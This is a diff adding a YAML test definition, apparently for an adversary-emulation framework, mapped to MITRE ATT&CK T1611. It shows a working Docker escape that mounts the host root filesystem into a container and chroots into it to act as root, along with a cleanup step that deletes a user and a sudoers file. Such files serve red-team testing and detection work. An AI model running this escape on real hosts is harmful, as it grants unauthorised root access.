@@ -1,0 +1,27 @@
+---
+- id: adb82c71f0d1c9fc22bcc7de4d8c65fa
+  name: Privilege Escalation via Docker Volume Mapping
+  description: 'This test demonstrates privilege escalation by abusing Docker''s volume
+    mapping
+
+    feature to gain access to the host file system. By mounting the root directory
+
+    of the host into a Docker container, the attacker can use chroot to operate as
+
+    root on the host system.
+
+    '
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1611
+    name: Escape to Host
+  platforms:
+    unknown:
+      sh:
+        command: 'echo "Current user: docker_user"; sudo -u docker_user sh -c "sudo
+          docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"'
+        payloads: []
+        cleanup: USERNAME="docker_user"; SUDOERS_FILE="/etc/sudoers.d/$USERNAME";
+          id "$USERNAME" &>/dev/null && userdel -r "$USERNAME" && echo -e "$USERNAME
+          is deleted."; [[ -f "$SUDOERS_FILE" ]] && rm -f "$SUDOERS_FILE"; echo "Cleanup
+          complete."
